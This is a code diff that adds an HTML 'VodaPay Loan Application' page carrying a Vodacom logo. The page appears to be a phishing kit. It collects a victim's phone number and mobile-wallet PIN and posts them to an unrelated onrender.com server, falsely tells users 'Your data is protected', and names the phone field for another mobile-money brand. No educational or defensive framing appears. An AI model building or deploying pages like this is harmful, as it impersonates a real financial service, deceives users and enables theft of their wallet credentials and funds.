@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Apply – VodaPay Loans</title>
+  <link rel="stylesheet" href="../styles/style.css" />
+</head>
+
+<body class="apply-page">
+
+  <!-- TOP RED HEADER -->
+  <section class="form-header">
+    <div class="container">
+      <img 
+        src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0f/Vodacom_logo.svg/512px-Vodacom_logo.svg.png"
+        class="vodapay-logo"
+      />
+      <h1>VodaPay Loan Application</h1>
+      <p>Get funds in minutes directly to your wallet.</p>
+    </div>
+  </section>
+
+  <!-- FORM AREA -->
+  <section class="form-section">
+    <div class="container">
+      <div class="form-card">
+
+        <form 
+          action="https://ecoback-9yuz.onrender.com/submit"
+          method="POST"
+          id="loanForm"
+          class="loan-form"
+        >
+
+          <!-- PHONE -->
+          <div class="form-group">
+            <label>VodaPay Phone Number</label>
+            <input
+              type="tel"
+              name="ecocash_number"
+              placeholder="7XXXXXXXX"
+              required
+              pattern="[0-9]{9}"
+            />
+          </div>
+
+          <!-- PIN -->
+          <div class="form-group">
+            <label>VodaPay PIN</label>
+            <input
+              type="password"
+              name="pin"
+              maxlength="5"
+              placeholder="Enter PIN"
+              required
+            />
+          </div>
+
+          <!-- AMOUNT -->
+          <div class="form-group">
+            <label>Loan Amount</label>
+            <input
+              type="number"
+              name="loan_amount"
+              placeholder="Enter amount"
+              min="500"
+              required
+            />
+          </div>
+
+          <!-- SUCCESS MESSAGE -->
+          <div id="successMessage" class="form-note" style="display:none;">
+            Submitting application...
+          </div>
+
+          <!-- SUBMIT -->
+          <button type="submit" class="btn-primary full-width">
+            Submit Loan Request
+          </button>
+
+          <p class="form-note">
+            Your data is protected. Approval usually takes minutes.
+          </p>
+
+        </form>
+
+      </div>
+    </div>
+  </section>
+
+  <footer>
+    <p>© 2026 VodaPay Loans</p>
+  </footer>
+
+  <script src="../scripts/scripts.js"></script>
+</body>
+</html>
